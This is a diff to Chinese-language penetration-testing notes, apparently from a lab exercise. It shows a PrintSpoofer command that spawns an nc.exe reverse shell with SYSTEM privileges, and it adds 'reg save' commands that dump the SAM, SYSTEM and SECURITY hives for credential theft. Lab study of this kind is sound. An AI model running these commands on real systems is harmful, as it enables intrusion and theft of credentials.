@@ -287,3 +287,8 @@ tcpdump -i ens192 -s 65535 -w ilfreight_pcap      抓网卡 ens192 的包，存�
 上传后，可以在 dmz01 主机上启动一个 Netcat 监听器 ，并运行以下命令以获取一个 NT AUTHORITY\SYSTEM 权限的反向 shell：
 c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
 
+下载SAM
+c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
+c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
+c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
+
